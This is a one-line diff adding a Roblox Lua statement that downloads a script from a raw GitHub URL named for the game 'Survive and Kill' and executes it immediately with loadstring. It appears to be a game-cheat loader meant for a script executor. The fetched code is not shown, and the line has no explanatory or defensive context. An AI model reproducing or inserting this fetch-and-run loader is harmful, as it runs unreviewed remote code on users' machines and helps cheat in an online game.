@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RageRelic/Scripts/scripts/Genhub_survive_and_kill", true))()
